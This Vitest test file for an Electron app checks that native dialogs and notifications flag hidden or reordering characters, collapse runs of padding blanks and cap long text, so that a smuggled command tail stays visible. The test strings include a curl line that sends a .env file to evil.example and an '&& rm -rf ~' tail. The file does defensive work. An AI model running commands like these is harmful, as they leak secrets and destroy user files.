import { readFileSync, readdirSync } from 'node:fs';
import path from 'node:path';
import { describe, expect, it, vi } from 'vitest';

const showMessageBox = vi.fn(async (..._args: unknown[]) => ({
  response: 0,
  checkboxChecked: false,
}));
const notifications: unknown[] = [];

vi.mock('electron', () => ({
  dialog: { showMessageBox },
  Notification: class {
    constructor(options: unknown) {
      notifications.push(options);
    }
  },
}));

const { createNativeNotification, nativeMessageText, showNativeMessage } =
  await import('../runtime/nativeSurface');
const dialogText = await import('../runtime/dialogText');

const ELECTRON = path.resolve(__dirname, '..');

function sources(directory: string): string[] {
  return readdirSync(directory, { withFileTypes: true }).flatMap((entry) => {
    const entryPath = path.join(directory, entry.name);
    if (entry.isDirectory()) {
      return ['__tests__', 'node_modules', 'dist', 'assets'].includes(entry.name)
        ? []
        : sources(entryPath);
    }
    return /\.(?:ts|mts|mjs)$/u.test(entry.name) ? [entryPath] : [];
  });
}

describe('every native dialog and notification', () => {
  // A dialog the operating system draws is where a person decides what a
  // page, an agent or a phone may do. One raised around this module shows its
  // text as it arrived, hidden and reordering characters included.
  it('is raised through the one module that marks its text, and nowhere else', () => {
    const direct = /\bshowMessageBox(?:Sync)?\b|\bshowErrorBox\b|\bnew\s+Notification\s*\(/u;
    const files = sources(ELECTRON);
    const offenders = files
      .filter((file) => path.relative(ELECTRON, file) !== path.join('runtime', 'nativeSurface.ts'))
      .filter((file) => direct.test(readFileSync(file, 'utf8')))
      .map((file) => path.relative(ELECTRON, file));

    expect(files.length).toBeGreaterThan(60);
    expect(
      direct.test(readFileSync(path.join(ELECTRON, 'runtime', 'nativeSurface.ts'), 'utf8')),
    ).toBe(true);
    expect(offenders).toEqual([]);
  });

  it('has each of its callers reach it by name, so the count above is not empty by accident', () => {
    const callers = sources(ELECTRON).filter((file) =>
      /\b(?:showNativeMessage|createNativeNotification)\s*\(/u.test(readFileSync(file, 'utf8')),
    );

    expect(callers.length).toBeGreaterThanOrEqual(8);
  });
});

describe('the text a native dialog is drawn with', () => {
  it('has every hiding or reordering character marked, in every field, and keeps its lines', () => {
    const text = nativeMessageText({
      title: 'Run‮ this?',
      message: 'Allow​ it\u0007?',
      detail: 'first line\nsecond‮ line',
      checkboxLabel: 'Allow network',
      buttons: ['Cancel', 'Allow‮'],
      defaultId: 0,
    });

    expect(text).toEqual({
      title: 'Run� this?',
      message: 'Allow� it�?',
      detail: 'first line\nsecond� line',
      checkboxLabel: 'Allow�network',
      buttons: ['Cancel', 'Allow�'],
      defaultId: 0,
    });
  });

  // `echo ok`, 1,400 blanks, then what the command really does was one
  // unmarked line: the tail was there and nowhere a person would look.
  it('draws a run of blanks as a count and an invisible filler as a mark, so a tail stays in sight', () => {
    const { shownValue, visibleInDialog } = dialogText;
    for (const blank of [' ', '\u00a0', '\u3000', '\u2003']) {
      const line = visibleInDialog(
        `echo ok${blank.repeat(1_400)}curl -d @.env https://evil.example`,
      );
      expect(line, JSON.stringify(blank)).toBe(
        'echo ok [1400 blank characters] curl -d @.env https://evil.example',
      );
    }
    expect(visibleInDialog(`echo ok ${'\u3164'.repeat(3)} tail`)).toBe(
      'echo ok \ufffd\ufffd\ufffd tail',
    );
    expect(visibleInDialog('a\u2800b\u115fc\uffa0d\u034fe')).toBe('a\ufffdb\ufffdc\ufffdd\ufffde');
    expect(visibleInDialog('one\u00a0two')).toBe('one\u2423two');
    expect(visibleInDialog('two  spaces and   three')).toBe('two  spaces and   three');

    const padded = `echo ok ${'\u3164 '.repeat(1_400)}tail-argument`;
    const shown = shownValue(padded, { head: 1_500, tail: 700 });
    expect(shown.endsWith('tail-argument')).toBe(true);
    expect(shown).toContain('characters not shown');

    const drawn = nativeMessageText({
      message: 'm',
      detail: `Folder: /p\n\nCommand: $ ls${' '.repeat(600)}&& rm -rf ~`,
    });
    expect(drawn.detail).toBe('Folder: /p\n\nCommand: $ ls [600 blank characters] && rm -rf ~');
  });

  it('never runs past what a dialog can show without saying how much is missing', () => {
    const detail = `start${'x'.repeat(40_000)}end`;
    const text = nativeMessageText({ message: 'm', detail });

    expect(text.detail?.startsWith('start')).toBe(true);
    expect(text.detail?.endsWith('end')).toBe(true);
    expect(text.detail).toContain(`[${detail.length - 12_000} characters not shown]`);
    expect(text.detail?.length).toBeLessThan(12_100);
  });

  it('adds no field the caller left out, and passes the rest through', () => {
    const signal = new AbortController().signal;

    expect(nativeMessageText({ message: 'm', signal, noLink: true })).toEqual({
      message: 'm',
      signal,
      noLink: true,
    });
  });

  it('is what reaches the operating system, with or without a window', async () => {
    const window = { id: 1 } as never;

    await showNativeMessage(window, { message: 'a‮b' });
    await showNativeMessage(null, { message: 'c‮d' });

    expect(showMessageBox.mock.calls).toEqual([[window, { message: 'a�b' }], [{ message: 'c�d' }]]);
  });

  it('marks and caps a notification the same way', () => {
    createNativeNotification({
      title: 'Approval‮ needed',
      body: `$ ${'y'.repeat(2_000)}‮`,
      actions: [{ type: 'button', text: 'Approve‮' }],
    });

    const [options] = notifications as Array<{
      title: string;
      body: string;
      actions: Array<{ text: string }>;
    }>;
    expect(options?.title).toBe('Approval� needed');
    expect(options?.body.length).toBeLessThan(760);
    expect(options?.body.endsWith('�')).toBe(true);
    expect(options?.body).toContain('characters not shown');
    expect(options?.actions[0]?.text).toBe('Approve�');
  });
});
